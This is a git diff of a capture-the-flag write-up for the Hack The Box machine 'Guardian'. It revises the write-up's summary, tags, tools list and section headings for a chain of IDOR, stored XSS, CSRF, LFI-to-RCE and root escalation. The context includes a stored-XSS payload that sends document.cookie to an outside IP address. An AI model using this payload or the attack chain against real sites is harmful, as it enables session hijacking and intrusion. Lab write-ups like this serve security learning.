@@ -2,15 +2,26 @@
 title: "HTB: Guardian"
 date: 2025-10-04 00:00 +0800
 categories: [Boot2Root]
-tags: [HTB,Hard]
+tags: [HTB,Hard,Web Exploitation,IDOR,LFI,RCE,Stored XSS,CVE-2024-56410]
 image: https://github.com/user-attachments/assets/6f036b82-9ddb-4ab3-a366-fb2371f975d0
 ---
 
 <img width="699" height="251" alt="image" src="https://github.com/user-attachments/assets/6f036b82-9ddb-4ab3-a366-fb2371f975d0" />
 
+Enumerated subdomain, chained an unauthenticated IDOR to leak creds, used **CVE-2024-56410** with stored-XSS to hijack session, abused weak CSRF to auto-create an admin privilege accounts, bypassed report regex with a ``php://filter`` chain for ``LFI`` --> ``RCE``, escalated via a sudo-able Python tool with a group-writable import, then ran ErrorLog reverse-shell config to pop root.
 
-Chained a stored XSS and LFI to access source and credentials, injected a shell via an ImageMagick transform to get RCE, decrypted backups to obtain passwords, and abused the `charcol` backup tool to gain root.
+## Tools
+- nmap
+- gobuster
+- Burp Suite Professional
+- TreeGrid
+- php_filter_chain_generator.py
+- hashcat
+- penelope
+- nano
+- subl
 
+netstat (service checks)
 ## Recon
 
 nmap scan result:
@@ -117,7 +128,7 @@ We might required valid creds to logged in as authorized user because there's no
 
 <img width="1714" height="849" alt="image" src="https://github.com/user-attachments/assets/42b3577e-e32d-43af-87bc-9fbc9127d336" />
 
-### Authenticated as student
+### Authenticated as Student
 
 <img width="1718" height="842" alt="image" src="https://github.com/user-attachments/assets/753af7b2-e209-449b-8a5d-744cd574065f" />
 
@@ -169,6 +180,8 @@ Payload used:
 ```
 <img src=x onerror=this.src='http://10.10.14.113:5432?cookie='+document.cookie>
 ```
+
+### Authenticated as Lecturers
 
 <img width="768" height="388" alt="image" src="https://github.com/user-attachments/assets/8efae4a6-dfb4-48d7-ab09-dc837d7f829f" />
 
@@ -307,6 +320,8 @@ To generate CSRF POC we can use **[Burpsuite Pro](https://portswigger.net/burp/d
 <img width="1882" height="633" alt="image" src="https://github.com/user-attachments/assets/5d65a38e-c68d-45ae-b05c-22c1be5408f5" />
 
 Again, we need **valid** ``csrf_token`` from the source code and, exchange the variables and value **required** to create new user from ``createuser.php``.
+
+### Authenticated as Admin
 
 Here's the final ``.html`` file:
 
@@ -514,7 +529,6 @@ mysql> show tables;
 +----------------------+
 9 rows in set (0.00 sec)
 ```
-
 There's users table
 ```
 mysql> select * from users;
